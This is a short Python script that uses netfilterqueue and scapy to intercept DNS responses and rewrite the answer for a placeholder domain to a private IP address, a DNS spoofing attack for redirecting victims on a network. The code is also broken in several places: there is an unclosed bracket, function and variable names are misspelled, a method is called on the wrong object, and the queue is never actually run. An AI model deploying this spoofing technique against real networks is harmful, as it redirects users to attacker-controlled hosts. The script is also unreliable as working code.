
#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy

def delfields(scapy_packet):
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.UDP.len
	del scapy_packet[scapy.UDP].chksum
	return scapy_packet
def packetprocess(p):
	scapy_packet=scapy.IP(p.get_payload())
	print(scapy_packet)
	if scapy_packet.haslayer(DNSRR):
		qname=scapy_packet[DNSQR].qname
	if  'ab.cc.dd.gg' in qname:
		answer=scapy.DNSRR(rrname=qname, rdata='192.168.199.132')
		scapy_packet[scapy.DNS].an=answer
		scapy_packet[scapy.DNS].ancount=1
		scapy_packet=del_fields(scapy_packets)

		scapy.set_payload(str(scapy_packet))

queue=netfilterqueue.NetfilterQueue()
queue.bind(0, packetprocess)
queue.run

